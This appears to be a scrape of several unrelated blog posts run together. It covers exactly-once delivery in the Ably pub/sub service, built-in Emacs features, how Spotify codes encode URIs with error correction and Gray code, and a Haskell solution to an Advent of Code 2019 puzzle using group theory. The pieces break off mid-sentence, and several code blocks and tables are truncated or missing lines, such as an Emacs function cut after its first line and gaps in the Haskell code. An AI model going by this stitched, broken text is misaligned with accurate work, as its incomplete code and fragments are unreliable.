<p>When a publisher fails, some sort of recovery process takes place. Depending on its design, after recovery, the publisher may reattempt to publish a message that has already been sent to and acknowledged by the broker. In such an event, the publisher failure causes at-least-once behaviour. Another scenario is that the publisher’s recovery procedure fails to realise that the publish attempt failed, which leads to at-most-once behaviour. </p>
<p>A strategy often used after a publish failure is to retry publishing the same message a fixed number of times. This is a pragmatic approach, but unsatisfactory in the context of exactly-once. Imagine that the publisher recovers and unsuccessfully tries to republish the same message five times, and then gives up. Practically none of the three semantics is achieved. To mitigate publisher failures Ably supports <a href="https://www.ably.io/topic/idempotency">idempotent publishing</a>, which ensures that regardless of how many times the same message is published to Ably, it will be delivered to subscribers exactly-once. <br></p>
<p><strong>Broker failure</strong></p>
<p>A broker failure has the potential to lead to all sorts of issues, including data loss. That’s why it’s recommended to design your system around the idea of mitigating or preventing loss of data. From a producer perspective, this could mean having the ability to publish messages at-least-once, so they can be resent to the broker if needed. </p>
<p>From a broker perspective (Ably included), let’s start by reviewing what a message ACK means. Obviously, it’s an acknowledgment that a published message has been received. Additionally, it should also imply that no subsequent failure will result in that message not being delivered to subscribers. In other words, it should be an acknowledgment that the broker provides sufficient redundancy to ensure continuity of service and onwards processing, even in the context of multiple infrastructure failures. Of course, nothing can be done to prevent or mitigate certain types of critical failures. When that happens, the sensible thing for the broker to do is to respond with a failure response (with HTTP, this is typically a 5xx status code), indicating clearly to the producer that the publish attempt was unsuccessful. </p>
<p><strong>Subscriber failure</strong></p>
<p>The most common subscriber failure that prevents exactly-once delivery involves short disconnections. For example, a client app on a mobile device will disconnect and quickly reconnect when the user switches from a mobile data network to a Wi-Fi network or goes through a tunnel. To counter this scenario and ensure exactly-once behaviour, the stream of messages must resume precisely where it left off when the subscriber recovers. For this to be possible, the connection state must be persisted and resynced when the subscriber reconnects.</p>
<p>If the broker is the one keeping track of the last message sent, you are unlikely to provide exactly-once semantics. That’s because a broker might send a message, and the subscriber might successfully receive it and then disconnect before sending an ACK to the broker. In such a case, once the subscriber reconnects, the broker will resend the respective message (at-least-once semantics) since it has no way of knowing that the subscriber had received it before disconnecting.</p>
<p>To ensure exactly-once behaviour, the responsibility of keeping track of the last message received should sit with the subscriber - something we also do at Ably, via serial numbers. This way, when the subscriber reconnects, it notifies the broker of the last message it has received so that the stream can be accurately resumed from a point in time.</p>
<h3 id="exactly-once-semantics-use-cases">Exactly-once semantics use cases</h3>
<p>In the world of distributed pub/sub systems, exactly-once semantics has been and continues to be extremely hard to achieve. Equally, almost everywhere you look in software development, exactly-once is a highly desirable system-wide property, if not an essential one. For example, exactly-once is crucial for most transactional messaging use cases. At its core, a transactional message is triggered by a consumer action, and it usually includes necessary or high-priority info, e.g., a bank balance inquiry or an order confirmation. </p>
<p>Ordered operations represent another use case where exactly-once is fundamental. Let’s say you want to use <a href="https://www.ably.io/blog/message-delta-compression/">delta compression</a> to only stream changes from the previous message to subscribers each time there’s an update. To achieve this, you need to use a transport that ensures data integrity through guaranteed message ordering and exactly-once semantics.</p>
<p>If not crucial, exactly-once is at least highly desirable, because it improves overall system predictability and provides better experiences to users in general. For example, …</p></div></section></article></div></div></div>

November 19, 2020 | https://karthinks.com/software/batteries-included-with-emacs/ | <a href="https://web.archive.org/web/*/https://karthinks.com/software/batteries-included-with-emacs/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody">
      <p>Emacs has a reputation for being borderline unusable out of the box, of being
bloated but somehow surprisingly bare.</p>
<p>This is largely a discoverability problem<sup id="fnref:1"><a href="#fn:1" role="doc-noteref">1</a></sup>. The solution
the Internet has settled on seems to be “Emacs distributions” like Doom,
Spacemacs or Prelude that glue together dozens (sometimes hundreds) of addons to
deliver a batteries included, finely tuned and user-friendly experience from
first launch. While it’s not for me, this does work
great&nbsp;<sup id="fnref:2"><a href="#fn:2" role="doc-noteref">2</a></sup>, and many of these packages will probably make
their way into the default Emacs experience in due time.</p>
<p>But while modern features like built-in LSP support, faster syntax highlighting
(through tree-sitter) and ligature support are still being debated in the
development mailing list, the long running, slow moving train of Emacs has
picked up many interesting passengers.</p>
<p>Emacs as shipped does a lot more than meets the eye, and external package
functionality often partially replicates built in behavior.</p>
<p>Here is a list of useful features in emacs I use regularly that I don’t see
mentioned or recommended often online. Guidelines I used to populate this list:</p>
<ul>
<li>No packages, <strong>stock Emacs only</strong>.</li>
<li>No steep learning curves. <strong>Learn each feature in under two minutes or bust</strong>.</li>
<li><strong>No gimmicks</strong>. No doctor, tetris, snake, dunnet, zone or butterfly.</li>
<li><strong>Just the deltas</strong>. No commonly mentioned packages like flymake, doc-view,
outline-minor-mode or eww/w3m. Nothing that Emacs brings up automatically or a
nonspecific Google search gets you.</li>
<li>Assume a modern Emacs, 26.3+.</li>
</ul>
<p>The list is written in the language of Emacs’ conventions. If you’re new to
Emacs, here’s some extra cognitive load for you:</p>
<table>
<thead>
<tr>
<th>Emacs jargon</th>
<th>Modern parlance</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>M-x</code></td>
<td>Alt + x</td>

<tr>
<td><code>C-x</code></td>
<td>Ctrl + x</td>

<td>Active Region</td>
<td>Text selection</td>

<tr>
<td>Region</td>
<td>Text selection (not highlighted)</td>

</tbody>
</table>
<p>OK? Let’s go.</p>
<hr>
<h2 id="artist-mode--m-x-artist-mode">Artist mode (<code>M-x artist-mode</code>)</h2>
<p>Turn Emacs into an Ascii art based paint program. Draw (poly-)lines, rectangles

<p>I’m not much of an (ascii) artist, but I do use <code>artist-mode</code> to draw boxes when
writing documentation or READMEs.</p>
<hr>
<h2 id="pulse--pulse-dot-el">Pulse (<code>pulse.el</code>)</h2>
<p>The included pulse library provides functions to flash a region of text. The
most useful general application is to flash the line the cursor is on as a
navigational aid or accessibility feature.</p>

<p>As is the annoying case with many things Emacs though, it provides all the
ingredients and lights the flame but leaves the cooking to you. Here’s a simple
recipe:</p>
<div><pre><code data-lang="emacs-lisp">(<span>defun</span> <span>pulse-line</span> (<span>&amp;rest</span> <span>_</span>)

<h2 id="undo-in-region--c">Undo in region (<code>C-/</code>)</h2>
<p>Limit your undoing to the active region:</p>

    <img src="https://karthinks.com/img/undo-in-region-demo.gif">

<p>There’s nothing to set up or run here. This is the default behavior of undo in
Emacs.</p>
<hr>
<h2 id="follow-mode--m-x-follow-mode">Follow mode (<code>M-x follow-mode</code>)</h2>
<p>Most monitors are much wider than they are tall. Most text files are much longer
than they are wide. That’s a problem.</p>
<p><code>follow-mode</code> shows a contiguous buffer paginated across multiple windows. The
cursor flows from one window to the next.</p>

<hr>
<h2 id="selective-display--c-x">Selective display (<code>C-x $</code>)</h2>
<p>If you code with rigid indentation, you can get a quick overview of your
document with <code>set-selective-display</code>. No mucking around with folding,
<code>outline-</code> or <code>hs-minor-mode</code> regexps.</p>
<figure>
    <img src="https://karthinks.com/img/set-selective-display-demo.gif"> 
</figure>

<p>Call the command with the prefix argument set to the column to hide. Call
without a prefix argument to disable.</p>
<hr>
<h2 id="pretty-symbols--m-x-prettify-symbols-mode">Pretty symbols (<code>M-x prettify-symbols-mode</code>)</h2>
<p>This one’s mainly for LaTeX users. Display unicode versions of math operators,
greek symbols and more. <code>M-x prettify-symbols-mode</code> in a TeX buffer.</p>
<figure>

<p>The equivalent in <code>org-mode</code> is <code>M-x org-toggle-pretty-entities</code>. Other major
modes will have to define the replacements explicitly to get this behavior.

<h2 id="view-mode--m-x-view-mode">View mode (<code>M-x view-mode</code>)</h2>
<p>Provide pager-like keybindings. Makes navigating read-only buffers a breeze.
Move down and up with <code>SPC</code> and <code>delete</code> (backspace) or <code>S-SPC</code>, half a page
down and up with <code>d</code> and <code>u</code>, and isearch with <code>s</code>.</p>
<p>This is my preferred way to read code or documents as I can avoid chorded
commands. Note that <code>evil-mode</code> doesn’t help here either, since paging is bound
to <code>C-u/d/f/b</code>.</p>
<p><del>To that end I just hook this into <code>read-only-mode</code>.</del> Prolific emacser <a href="https://old.reddit.com/r/emacs/comments/jwhr6g/batteries%5Fincluded%5Fwith%5Femacs/gct12vp/">Omar
Antolin Camarena</a> points out a built-in way to use <code>view-mode</code> in all read-only
buffers, including ones you set read-only with <code>C-x C-q</code>:</p>
<p>This is my favorite feature of the bunch, considering how much time I spend in
Emacs reading things.</p>
<hr>
<h2 id="cycle-spacing--m-spc">Cycle-spacing (<code>M-SPC</code>)</h2>
<p>The <code>cycle-spacing</code> command is more versatile than it appears. By default, it
cycles between deleting all whitespace around cursor but one, deleting all
whitespace and restoring whitespace. But with a negative argument, it deletes
all blank lines around the cursor. (Calling it with a negative argument is fast:
Hold down Meta and hit minus and space in sequence.)</p>
<p>Put together, it’s doing the job of (almost) three older commands:
<code>just-one-space</code>, <code>delete-horizontal-space</code> and
<code>delete-blank-lines</code><sup id="fnref:3"><a href="#fn:3" role="doc-noteref">3</a></sup> This opens up the
bindings <code>C-x C-o</code> and <code>M-\</code> for more useful functions.</p>
<hr>
<h2 id="indirect-buffers--m-x-make-indirect-buffer">Indirect buffers (<code>M-x make-indirect-buffer</code>)</h2>
<p>One buffer. Two windows. Two states.</p>
<p>This one’s for outline/org users. Do you want to see an overview of your
document <em>and</em> the section you’re working on? <code>M-x make-indirect-buffer</code> or <code>M-x clone-indirect-buffer</code></p>
<p>Here I clone an org buffer and narrow the original to get a makeshift TOC:
<img src="https://karthinks.com/img/indirect-buffer-demo.gif" alt=""></p>
<p>At this point we’re a few lines of elisp away from writing a <code>toc-minor-mode</code>
for org files!</p>
<p>But the possibilities are much larger, because as the manual puts it:</p>
<blockquote>
<p>The text of the indirect buffer is always identical to the text of its base
buffer; changes made by editing either one are visible immediately in the other.
But in all other respects, the indirect buffer and its base buffer are
completely separate. They can have different names, different values of point,
different narrowing, different markers, different major modes, and different
local variables.</p>
</blockquote>
<hr>
<h2 id="html-fontify--m-x-htmlfontify-buffer">Html-fontify (<code>M-x htmlfontify-buffer</code>)</h2>
<p>Reproduce the look of your emacs buffer as a html file with CSS. This is either
extremely useful or useless to you!</p>
<p><a href="https://karthinks.com/share/htmlfontify-demo.html">Here</a> is the html-fontified version of the
source file of this write-up.</p>
<hr>
<h2 id="dwim-commands--upcase-downcase-and-more">DWIM commands (upcase, downcase  and more<sup id="fnref:4"><a href="#fn:4" role="doc-noteref">4</a></sup>)</h2>
<p>Modern versions of Emacs provide Do-What-I-Mean versions of various editing
commands: They act on the region when the region is active, and on an
appropriate semantic unit otherwise. Replace <code>upcase-word</code> and <code>downcase-word</code>
with <code>upcase-dwim</code> and <code>downcase-dwim</code> respectively, and you can safely eject
the bindings for <code>upcase-region</code> and <code>downcase-region</code>.<sup id="fnref:5"><a href="#fn:5" role="doc-noteref">5</a></sup></p>
<div><pre><code data-lang="emacs-lisp">(<span>global-set-key</span> (<span>kbd</span> <span>"M-u"</span>) <span>'upcase-dwim</span>)
(<span>global-set-key</span> (<span>kbd</span> <span>"M-l"</span>) <span>'downcase-dwim</span>)
(<span>global-set-key</span> (<span>kbd</span> <span>"M-c"</span>) <span>'capitalize-dwim</span>)
</code></pre></div><p>DWIM is standard behavior for emacs commands even when it doesn’t say that in
the name. <code>count-words</code>, <code>query-replace</code>, the list goes on. Check to see if your
frequently used commands DWYM.</p>
<hr>
<h2 id="unit-conversion-in-calc--m-x-calc">Unit conversion in calc (<code>M-x calc</code>)</h2>
<p>It’s <code>u c</code>. And <code>'</code> (quote) for algebraic entry: <img src="https://karthinks.com/img/calc-units-demo.gif" alt="">
<code>calc</code> does a lot more with units. You can simplify, define new unit conversions
and more. Hit <code>u ?</code> to see your options.</p>
<hr>
<h2 id="symbolic-computation-in-calc--m-x-calc">Symbolic computation in calc (<code>M-x calc</code>)</h2>
<p>We’re skirting the “<strong>learn each feature in under two minutes or bust</strong>” rule with
this one, as it deserves its own write-up, or a perusal of the manual. The
general interaction paradigm is simple, though.</p>
<p>Let’s find a Taylor expansion of the integral of the error function:
<img src="https://karthinks.com/img/calc-symbolic-demo.gif" alt=""></p>
<p>Access algebraic routines (root finding, symbolic manipulation) in calc under
the <code>a</code> prefix. Indefinite integration is <code>a i</code>, differentiation is <code>a d</code>,
solving algebraic equations is <code>a S</code> and so on. (Hit <code>a ?</code>)</p>
<hr>

<p>What it says on the tin. Move the buffer instead of the cursor when navigating.
Just press the scroll lock key or <code>M-x scroll-lock-mode</code>.</p>
<hr>
<h2 id="tabs--m-x-tab-bar-mode">Tabs (<code>M-x tab-bar-mode</code>)</h2>
<p>These are mentioned often, but rarely recommended. Most Emacs users find the
idea of tabs in Emacs to be redundant, but will happily recommend window
configuration registers, which provide similar functionality.</p>
<p>Tabs work great to separate projects, or work and email buffers. In principle
this is equivalent to popping up a new frame and letting the window manager
handle the separation, but on stacking window managers I find tabs to be much
preferable.</p>
<p>Since there’s never one way to do something in Emacs, a secondary
<code>tab-line-mode</code> is available that adds tabs to each window instead of frame.</p>
<hr>
<h2 id="next-time">Next time:</h2>
<ul>
<li><code>icomplete</code> and <code>fido</code>: Incremental completion systems</li>
<li><code>completion-styles</code>: Supercharge completion in the minibuffer</li>
<li><code>re-builder</code> and <code>rx</code>: Visual regular expressions</li>
<li><code>orgtbl-mode</code>: Easy table formatting everywhere</li>

I set out to figure out how they worked, which lead me on a winding journey through barcode history, patents, packet sniffing, error correction, and Gray tables.</p><h2 id="spotify-uris">Spotify URIs</h2><p>Let’s start with Spotify URIs (Uniform Resource Identifiers). Different pieces of media (artists, albums, songs, playlists, users) all have a URI.</p><p>The ABBA song “Take a Chance on Me” has this URI:</p><p><code>spotify:track:6vQN2a9QSgWcm74KEZYfDL</code>.</p><p>The ABBA Album “The Album” has the following URI:</p><p><code>spotify:album:5GwbPSgiTECzQiE6u7s0ZN</code></p><p>As you can see, the URIs can be broken up into components:</p><p><code>spotify:&lt;media type&gt;:&lt;22 characters&gt;</code>.</p><p>The 22 characters are the numbers 0-9, characters a-z and A-Z. This means there are <code>10 + 26 + 26 = 62</code> possibilities for each character (almost <a href="https://en.wikipedia.org/wiki/Base64">Base64</a>). So the potential number of Spotify URIs is <code>62^22</code> which is equal to <code>2.7e39</code> or</p><div><pre><code data-lang="python"><span>2</span>,<span>707</span>,<span>803</span>,<span>647</span>,<span>802</span>,<span>660</span>,<span>400</span>,<span>290</span>,<span>261</span>,<span>537</span>,<span>185</span>,<span>326</span>,<span>956</span>,<span>544</span>

Safe to say Spotify is not going to run out of URIs anytime soon.</p><h2 id="barcode-background">Barcode background</h2><p>The <a href="https://en.wikipedia.org/wiki/Barcode">history of barcodes</a> is quite extensive. Information is encoded into different barcodes in a variety of ways.</p><p>A lot of barcodes encode data in the <strong>widths</strong> of vertical bars. Universal product codes (UPCs) encode 12 digits using combinations of vertical bars of different widths:</p><p><img src="https://boonepeter.github.io/imgs/spotify/upc.png" alt="UPC encodings"></p><p><a href="https://en.wikipedia.org/wiki/KarTrak">Another barcode</a> uses colors to encode data:</p><p><img src="https://boonepeter.github.io/imgs/spotify/KarTrak_ACI_codes.svg.png" alt="Kartrack barcode"></p><p><a href="https://en.wikipedia.org/wiki/QR_code">QR codes</a> use a 2d matrix of dots to encode data.</p><p><img src="https://boonepeter.github.io/imgs/spotify/qr_code.png" alt="QR code"></p><p>A lot of mail barcodes encode data using the <strong>height</strong> of the bars (like the <a href="https://en.wikipedia.org/wiki/Intelligent_Mail_barcode">Intelligent Mail barcode</a>).</p><p><img src="https://boonepeter.github.io/imgs/spotify/intelligent_mail_barcode.png" alt="Intelligent mail barcode"></p><h2 id="spotify-codes">Spotify Codes</h2><p>Spotify codes work like the <a href="https://en.wikipedia.org/wiki/Intelligent_Mail_barcode">Intelligent Mail Barcode</a>.

This must help in identifying if the barcode is valid. Having the 12th bar as the max height also helps you calculate the ratios of the bar heights. I suspect setting the first and last bar set to 0 is an aesthetic choice: it makes the barcode look more like a sound wave.

This media reference is 37 bits long and is the key that links a barcode to a given URI. The media reference may just be the hash of an incrementing index. After extracting a media reference from a barcode, you check with Spotify’s database (a look-up table) to determine what URI it corresponds to.

This makes the decoding process more reliable. Decoding Spotify codes involves going from analog (bar lengths) to digital (media reference), so it is a good candidate for this error correction.</p><blockquote><p>The fundamental principle of [error correction] is to add redundant bits in order to help the decoder to find out the true message that was encoded by the transmitter.</p></blockquote><p>A simple example of error correction would be to replicate each bit twice. So instead of sending <code>1</code>, you would send <code>111</code>. When that triplet is sent across a “noisy” communication channel, some of the bits could get flipped. But since there are 2 redundant bits, the receiver can guess what the value was meant to be:</p><table><thead><tr><th>Triplet received</th><th>Interpreted as</th></tr></thead><tbody><tr><td>000</td><td>0 (error-free)</td></tr><tr><td>001</td><td>0</td></tr><tr><td>010</td><td>0</td></tr><tr><td>100</td><td>0</td></tr><tr><td>111</td><td>1 (error-free)</td></tr><tr><td>110</td><td>1</td></tr><tr><td>101</td><td>1</td></tr><tr><td>011</td><td>1</td></tr></tbody></table><p>The patents don’t specify what forward error correction schema Spotify uses, but they do say that they add 15 bits at this step. The code rate of an error correction scheme is the ratio of the information bits to the total encoded bit length. Spotify adds 15 bits to the 45 bit code, so the code rate is <code>45 / 60 = 0.75</code>. This code rate is high (close to 1) meaning it is fairly weak. It facilitates a limited amount of error correction, but that is okay. If you are sending a message to a deep space probe you want a very strong code. A Spotify code is pretty low risk: it’s easy to ping the server a few times if you decode the wrong media reference.</p><p>The total forward error corrected code is 60 bits long, which is the exact amount of information that can be encoded in the 20 octals (bar heights) in the Spotify barcode!</p><p>The patents do mention that Spotify uses the <a href="https://en.wikipedia.org/wiki/Viterbi_decoder">Viterbi algorithm</a> to decode the media reference from the forward error corrected code. I won’t go into it here, but that algorithm uses the redundant bits from the forward error correction to determine the best guess of the actual media reference.</p><h3 id="gray-code">Gray Code</h3><p>I really like this part of the Spotify codes.</p><p><a href="https://en.wikipedia.org/wiki/Gray_code">Gray code</a> is an alternative way to represent a binary number. If you look closely at the following table, you will see that Gray code works by changing only one bit at a time.</p><table><thead><tr><th>Decimal</th><th>Binary</th><th>Gray</th></tr></thead><tbody><tr><td>0</td><td>000</td><td>000</td></tr><tr><td>1</td><td>001</td><td>001</td></tr><tr><td>2</td><td>010</td><td>011</td></tr><tr><td>3</td><td>011</td><td>010</td></tr><tr><td>4</td><td>100</td><td>110</td></tr><tr><td>5</td><td>101</td><td>111</td></tr><tr><td>6</td><td>110</td><td>101</td></tr><tr><td>7</td><td>111</td><td>100</td></tr></tbody></table><p>Why does Spotify use Gray code? What is wrong with normal binary representation of the code?</p><p>The difference between 3 and 4 in Gray code is only 1 bit (<code>010 -&gt; 110</code>). In normal binary representation, that difference is 3 bits (<code>100 -&gt; 011</code>). When going from analog (the height of a given bar) to binary, using Gray codes reduces the number of bits that are “wrong” if we calculate the wrong height.</p><p>If the height of a bar is supposed to be 3, but we calculate that it is 3.51 and we round up to 4, the binary representation of that number in Gray code will only be off by one bit. <strong>This makes the forward error …</strong></p></div></article></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>So it’s November, and <a href="https://adventofcode.com/">Advent of Code</a> season is in the air! It’s time for everyone’s favorite Santa-based light hearted learn-to-program-or-a-new-language holiday season programming challenge series. Every year a bunch of us gather around the fireplace, roast chestnuts, and brainstorm all of the interesting ways we can solve these cute themed puzzles every day. These puzzles are designed to accessible enough for most new programmers, but deep enough to provide entertainment for experienced ones. I’ve <a href="https://blog.jle.im/entries/tagged/advent-of-code.html">written many blog posts</a> on some of the interesting insight some of the puzzles have yielded, and I also <a href="https://github.com/mstksg/advent-of-code-2019/blob/master/reflections.md">post my reflections on as many puzzles I can</a> while solving them in Haskell. And if you’re solving things in Haskell, I also published an <a href="https://hackage.haskell.org/package/advent-of-code-api">open-sourced rate-limited API library</a> so you can fetch and submit answers from the comfort of your command line.</p>
<p>To kick off the season, I’ve decided to write about one of my favorite puzzles from Advent of Code 2019 – <a href="https://adventofcode.com/2019/day/22">Day 22: Slam Shuffle</a>. To me, it stands out because it’s a perfect example of how Haskell’s approach to mathematical abstraction nudges you into the direction of an efficient solution — in a way that other languages would obscure or make less obvious.</p>
<p>So, let’s dive in! In the end, hopefully this post can get you excited for this wonderful season, and maybe also shed some insight into what it means when we say that Haskell can help you leverage math to find good solutions to your real problems.</p>
<p>Of course, this post has spoilers for Advent of Code 2019 Day 22, if you are planning on trying to figure it out from yourself. If you haven’t tried it, I recommend you give it a shot and come back after! :D</p>
<h2 id="slam-shuffle">Slam Shuffle</h2>
<p>If you haven’t already, take some time to <a href="https://adventofcode.com/2019/day/22">read through the problem statement</a>. The basic idea is that we are given a series of operations to “shuffle” a deck of 10007 cards, such as:</p>
<pre><code>deal with increment 7
deal into new stack
deal into new stack
... etc</code></pre>
<p>After performing all of the many operations, the question then asks about the card at a given position (the 2019th card in the deck).</p>
<p>Part 2, which you might not be able to see if you haven’t submitted an answer yet for Part 1, involves the same process with a deck of 119315717514047 cards, and repeating the entire shuffling sequence 101741582076661 times. It then asks you to find the card that ends up at index 2020.</p>
<p>In this problem, it seems we have a list of “shuffles” that we want to run on a deck of cards. However, let’s think about this in a more data-driven approach: instead of thinking about successive shufflings of cards, let’s imagine the specification of a “shuffle” itself as our main data, and how we can combine shuffle operations together into new shuffle operations.</p>
<p>We are looking for “take shuffle A and shuffle B, and return a new shuffle that represents doing B, then A”. This is “shuffle composition”, or “permutation composition” (<a href="https://en.wikipedia.org/wiki/Permutation">permutation</a> being the mathematical word for “shuffling” here, basically)</p>
<p>Since we’ve identified that we want to begin implementing a way of composing/combining permutations together, we can do a bit of reading to learn that one of the most famous properties of permutation composition is that they form a “group”, which means they can be composed (associatively), have an identity, and can be inverted. This means that if you have two permutations, you can “squish” them to create a new permutation, and work with that <em>new</em> permutation.</p>
<p>I’ve talked about <a href="https://blog.jle.im/entry/alchemical-groups.html">using group theory</a> principles before in this blog to help guide us towards solutions and optimizations — the main principle is that if we express our program in terms of group operations, then we can take advantage of the large body of knowledge built up over centuries to understand, analyze, and potentially optimize our program.</p>
<p>The <em>first</em> big advantage in this situation is that we can treat our transformations <em>as data</em>, and not as functions. And that if we have two transformations, we can always create a new one (just a normal data type value) that represents the composition of the two original ones.</p>
<h2 id="now-youre-thinking-with-groups">Now You’re Thinking With Groups</h2>
<p>Knowing permutations are a group, it means that once we settle on our representation of them, <code>Perm</code>, we can write an instance of <code>Perm</code> for <code>Semigroup</code>, <code>Monoid</code>, and <code>Group</code>, abstractions in Haskell that many types are already instances of. Abstractions like <code>Semigroup</code> and <code>Monoid</code> are pretty much an everyday thing in Haskell, so this fits in quite nicely. <code>Group</code> comes from the <em><a href="https://hackage.haskell.org/package/groups">groups</a></em> package, which also provides some nice applications of group theory.</p>
<div id="cb2"><pre><code><span id="cb2-1"><a href="#cb2-1"></a><span>data</span> <span>Perm</span> n <span>=</span> <span>...</span> <span>-- let's figure out the implementation later, where n is the number of cards</span></span></code></pre></div>
<p>In Haskell, we express things like “<code>Perm</code> is a Semigroup/Monoid/Group” by saying that they are instances of <em>typeclasses</em>, which (for this purpose) are like interfaces in languages like Java.</p>
<div id="cb3"><pre><code><span id="cb3-1"><a href="#cb3-1"></a><span>-- | An instance m can be "combined" using `x &lt;&gt; y`</span></span>

<span id="cb3-3"><a href="#cb3-3"></a><span>    (&lt;&gt;) ::</span> m <span>-&gt;</span> m <span>-&gt;</span> m</span>

<span id="cb3-5"><a href="#cb3-5"></a><span>-- | There is always an identity element for &lt;&gt;:</span></span>

<span id="cb3-7"><a href="#cb3-7"></a><span>-- x &lt;&gt; mempty == x</span></span>
<span id="cb3-8"><a href="#cb3-8"></a><span>-- mempty &lt;&gt; x == x</span></span>
<span id="cb3-9"><a href="#cb3-9"></a><span>--</span></span>
<span id="cb3-10"><a href="#cb3-10"></a><span>class</span> <span>Semigroup</span> m <span>=&gt;</span> <span>Monoid</span> m <span>where</span></span>
<span id="cb3-11"><a href="#cb3-11"></a><span>    mempty ::</span> m</span>
<span id="cb3-12"><a href="#cb3-12"></a></span>
<span id="cb3-13"><a href="#cb3-13"></a><span>-- | Every m has an inverse:</span></span>
<span id="cb3-14"><a href="#cb3-14"></a><span>--</span></span>
<span id="cb3-15"><a href="#cb3-15"></a><span>-- x &lt;&gt; invert x == mempty</span></span>
<span id="cb3-16"><a href="#cb3-16"></a><span>-- invert x &lt;&gt; x == mempty</span></span>
<span id="cb3-17"><a href="#cb3-17"></a><span>--</span></span>
<span id="cb3-18"><a href="#cb3-18"></a><span>class</span> <span>Monoid</span> m <span>=&gt;</span> <span>Group</span> m <span>where</span></span>
<span id="cb3-19"><a href="#cb3-19"></a><span>    invert ::</span> m <span>-&gt;</span> m</span></code></pre></div>
<p>This means that if <code>Perm</code> is an instance of <code>Group</code> (which has superclasses <code>Semigroup</code> and <code>Monoid</code>), we can:</p>
<ul>
<li>Compose permutations using <code>x &lt;&gt; y</code>, which means “shuffle with strategy <code>y</code>, then with strategy <code>x</code>”</li>
<li>Summon an “identity permutation” where <code>x &lt;&gt; mempty == x</code> (the identity permutation, which is “leave things alone”).</li>
<li>Invert any shuffling (if we have <code>x</code>, we can reverse its effect with <code>invert x</code>)</li>
</ul>
<p>In addition, the standard libraries also give us a useful function <code>stimes</code></p>
<div id="cb4"><pre><code><span id="cb4-1"><a href="#cb4-1"></a><span>stimes ::</span> <span>Semigroup</span> m <span>=&gt;</span> <span>Int</span> <span>-&gt;</span> m <span>-&gt;</span> m</span></code></pre></div>
<p>which lets us compose <code>x</code> with itself (<code>stimes 5 x == x &lt;&gt; x &lt;&gt; x &lt;&gt; x &lt;&gt; x</code>), but can do it in <em>log(n)</em> time using <a href="https://en.wikipedia.org/wiki/Exponentiation_by_squaring">repeated squaring</a>. It’s extremely efficient in a lot of circumstances (more on that later) — more so than the naive compose-it-n-times implementation. This will definitely become useful in part 2, where we have to do 101741582076661 compositions.</p>
<h2 id="our-gameplan">Our Gameplan</h2>
<p>Just <em>knowing</em> that permutations form a group naturally guides us to these abstractions — we already know what <em>interface</em> our type will have, even before we write any code. We know that no matter <em>what</em> our implementation of permutation will be, we will have <code>(&lt;&gt;)</code>, <code>stimes</code>, <code>mempty</code>, <code>invert</code> available to us to use. So, let’s do just that! We’ll use a stub data type <code>Perm</code> to represent our permutation and “pretend” we have that interface on it. We’ll write our functions first and then fill in the interface later!</p>
<div id="cb5"><pre><code><span id="cb5-1"><a href="#cb5-1"></a><span>-- | Represents a permutation of n cards</span></span>
<span id="cb5-2"><a href="#cb5-2"></a><span>data</span> <span>Perm</span> n <span>=</span> <span>....</span></span>

<span id="cb5-14"><a href="#cb5-14"></a>    bigPerm <span>=</span> <span>mconcat</span> perms</span></code></pre></div>
<p>(<code>mconcat perms</code> composes all of the permutations one after another: <code>mconcat [x,y,z] = x &lt;&gt; y &lt;&gt; z</code>)</p>
<p>And…that’s it! For the actual “logic” of our part 1! All we need to do is implement <code>runPerm</code> and <code>parsePerm</code>.</p>
<p>Here, I’m using <code>Finite n</code> from the great <em><a href="https://hackage.haskell.org/package/finite-typelits">finite-typelits</a></em> library, where <code>Finite 100</code> represents “an index between 0 and 99”, etc. It’s just exactly the right “shape” to represent the index of a deck of cards. <em>finite-typelits</em> wasn’t designed with group theory in mind, but it’s still a great tool here — which is a testament to how flexible these abstractions can actually be :)</p>
<p>For example, it means that for a <code>Perm 10007</code> (a permutation of 10007 cards), the type of <code>runPerm</code> is <code>Perm 10007 -&gt; Finite 10007 -&gt; Finite 10007</code>, and the type of <code>parsePerm</code> is <code>String -&gt; Perm 10007</code>.</p>
<p>We can plan out our part 2 as well:</p>

<p>Part 2, I think, is where the group theory really shines.</p>
<ol type="1">
<li><p>We take advantage of <code>stimes</code>, which uses <a href="https://en.wikipedia.org/wiki/Exponentiation_by_squaring">repeated squaring</a>. That means that to compute <code>stimes 8 x</code>, instead of using</p>
<pre><code>x &lt;&gt; x &lt;&gt; x &lt;&gt; x &lt;&gt; x &lt;&gt; x &lt;&gt; x &lt;&gt; x</code></pre>
<p>it does</p>
<pre><code>let x2 = x &lt;&gt; x
    x4 = x2 &lt;&gt; x2
in  x4 &lt;&gt; x4</code></pre>
<p>essentially cutting down the number of multiplications exponentially. This means that to compute <code>stimes 101741582076661</code>, we only need to do about 47 multiplications (log base 2), and not 101741582076661.</p>
<p>This is only possible because we know that permutation composition is associative, so it doesn’t matter how we associate our parentheses. It is only “safe” to use repeated squaring if you <em>know</em> that your operation is associative. Having a semigroup abstraction <em>in the first place</em> guides us to this efficient solution — in a way that is pre-built just for us! This is made all the more powerful because <em>semigroup</em> is a ubiquitous abstraction in Haskell, so we “think about” it all the time.</p></li>
<li><p>Remember how <code>runPerm p 2019</code> gives us the index that <code>2019</code> is sent to? Well, we want something else in this case. We basically want the index that <em>will be sent to</em> <code>2020</code>. So, we want to <em>reverse the function</em>. Luckily, since our function is just a permutation, it is easy to reverse this: just <code>invert</code> the permutation!</p>
<p>The idea that we can simply invert a permutation instead of having to write a whole new permutation representation just to do “backwards indexing” is something that we are <em>guided to</em>, just by recognizing that permutations form a group.</p></li>
</ol>
<h2 id="a-first-guess-at-implementation">A first guess at implementation</h2>
<p>Now, time to do what we have been putting off and actually write our permutation representation – the definition of <code>Perm n</code>. A good <em>first guess</em> might be to write our permutation as an actual function — a function from index to index, <code>Finite n -&gt; Finite n</code>. Then, we can just use function composition as our permutation composition.</p>
<div id="cb9"><pre><code><span id="cb9-1"><a href="#cb9-1"></a><span>data</span> <span>Perm</span> n <span>=</span> <span>Perm</span> (<span>Finite</span> n <span>-&gt;</span> <span>Finit…</span></span></code></pre></div></div></div>

